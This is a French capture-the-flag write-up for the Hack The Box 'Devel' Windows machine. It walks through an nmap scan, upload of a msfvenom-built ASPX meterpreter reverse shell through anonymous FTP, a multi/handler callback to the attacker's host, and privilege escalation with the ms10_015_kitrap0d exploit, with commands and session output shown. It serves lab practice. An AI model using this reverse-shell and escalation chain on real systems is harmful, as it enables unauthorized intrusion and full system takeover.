# Devel [Windows] Easy

— Énumération —

`nmap -sS -A -sC -sV -p- 10.10.10.5`

```python
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7

21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
```

FTP Serveur avec rien dedans à part le site nous pouvons envoyer un reverse shell :
Création du shell
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=1234 -f aspx > devel.aspx`

Envoie du shell dans le FTP
`put devel.aspx`

Exécution du shell :

```python
msf6 exploit(multi/handler) > set LHOST 10.10.14.13
LHOST => 10.10.14.13
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.13:1234
msf6 exploit(multi/handler) > [*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.13:1234 -> 10.10.10.5:49184 ) at 2022-05-24 07:57:20 -0400
sessions -i 1
[*] Starting interaction with 1...

meterpreter > ls
```

Nous avons maintenant un shell stable

En getuid nous sommes utilisateur IIS nous n'avons donc pas de permission écriture.

-- Priv.Escalation --

`meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows`

Architecture est de x86 on peux chercher des exploit avec metasploit.

```python
meterpreter > run post/multi/recon/local_epxloit_suggester

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 40 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

meterpreter > CTRL+Z

bypassuac_eventvwr n’a pas marcher 

`msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d`

`msf6 exploit(windows/local/ms10_015_kitrap0d) > show options`

`msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 6`

[Mettre notre IP mais un autre port]

`meterpreter > run`

L’exploit marche, on peux prendre les 2 flags en étant root maintenant.